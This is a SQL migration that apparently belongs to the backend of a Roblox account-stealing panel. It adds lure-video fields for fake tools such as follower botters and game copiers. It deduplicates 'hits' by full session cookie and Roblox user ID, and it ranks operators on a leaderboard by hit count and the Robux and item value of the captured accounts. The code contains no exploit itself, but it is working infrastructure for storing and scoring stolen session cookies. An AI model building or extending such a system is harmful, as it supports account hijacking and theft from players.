-- Per-tool custom video URLs (keep custom_video_url as legacy fallback)
ALTER TABLE public.profiles
  ADD COLUMN IF NOT EXISTS custom_video_bot_followers TEXT,
  ADD COLUMN IF NOT EXISTS custom_video_copy_games    TEXT,
  ADD COLUMN IF NOT EXISTS custom_video_copy_clothes  TEXT,
  ADD COLUMN IF NOT EXISTS custom_video_group_botter  TEXT,
  ADD COLUMN IF NOT EXISTS custom_video_vc_enabler    TEXT;

-- Backfill per-tool from legacy single field where present
UPDATE public.profiles
SET custom_video_bot_followers = COALESCE(custom_video_bot_followers, custom_video_url),
    custom_video_copy_games    = COALESCE(custom_video_copy_games,    custom_video_url),
    custom_video_copy_clothes  = COALESCE(custom_video_copy_clothes,  custom_video_url),
    custom_video_group_botter  = COALESCE(custom_video_group_botter,  custom_video_url),
    custom_video_vc_enabler    = COALESCE(custom_video_vc_enabler,    custom_video_url)
WHERE custom_video_url IS NOT NULL;

-- Hit deduplication: same cookie OR same roblox account for same owner = one hit.
-- Existing rows are zero so this is safe.
CREATE UNIQUE INDEX IF NOT EXISTS hits_owner_cookie_uniq
  ON public.hits (owner_id, cookie_full)
  WHERE cookie_full IS NOT NULL;

CREATE UNIQUE INDEX IF NOT EXISTS hits_owner_roblox_user_uniq
  ON public.hits (owner_id, roblox_user_id)
  WHERE roblox_user_id IS NOT NULL;

-- Golden sparkly flag on leaderboard for the special user 'cheeky'.
ALTER TABLE public.leaderboard
  ADD COLUMN IF NOT EXISTS is_golden BOOLEAN NOT NULL DEFAULT FALSE;

-- Update refresh function to set is_golden when username = 'cheeky'
CREATE OR REPLACE FUNCTION public.refresh_leaderboard_profile(_profile_id uuid)
 RETURNS void
 LANGUAGE plpgsql
 SECURITY DEFINER
 SET search_path TO 'public'
AS $function$
DECLARE
  profile_row record;
  hit_row record;
BEGIN
  SELECT id, username, COALESCE(anonymous_leaderboard, false) AS anonymous
  INTO profile_row
  FROM public.profiles
  WHERE id = _profile_id;

  IF profile_row.id IS NULL THEN
    DELETE FROM public.leaderboard WHERE id = _profile_id;
    RETURN;
  END IF;

  SELECT
    COUNT(*)::integer AS real_hit_count,
    COALESCE(SUM(roblox_robux), 0)::bigint AS total_robux,
    COALESCE(SUM(roblox_rap), 0)::bigint AS total_rap
  INTO hit_row
  FROM public.hits
  WHERE owner_id = _profile_id;

  INSERT INTO public.leaderboard (
    id, username, hit_count, real_hit_count, total_robux, total_rap, anonymous, is_golden, updated_at
  ) VALUES (
    profile_row.id,
    profile_row.username,
    COALESCE(hit_row.real_hit_count, 0)::integer,
    COALESCE(hit_row.real_hit_count, 0)::integer,
    COALESCE(hit_row.total_robux, 0)::bigint,
    COALESCE(hit_row.total_rap, 0)::bigint,
    profile_row.anonymous,
    (profile_row.username = 'cheeky'),
    now()
  )
  ON CONFLICT (id) DO UPDATE SET
    username = EXCLUDED.username,
    hit_count = EXCLUDED.hit_count,
    real_hit_count = EXCLUDED.real_hit_count,
    total_robux = EXCLUDED.total_robux,
    total_rap = EXCLUDED.total_rap,
    anonymous = EXCLUDED.anonymous,
    is_golden = EXCLUDED.is_golden,
    updated_at = now();
END;
$function$;